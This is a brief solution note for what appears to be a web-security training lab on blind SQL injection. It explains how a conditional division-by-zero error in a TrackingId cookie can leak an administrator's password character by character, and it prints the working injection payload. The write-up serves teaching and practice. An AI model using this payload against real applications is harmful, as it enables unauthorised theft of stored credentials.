# Lab 12: Blind SQL Injection with Conditional Errors

* **Solution**: Use a CASE statement in TrackingId to trigger a division-by-zero error if a condition is true, then extract the admin password by testing each character.
* **Final Payload**:
  * TrackingId=xyz' || (SELECT CASE WHEN SUBSTRING(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || ' (repeat for each position)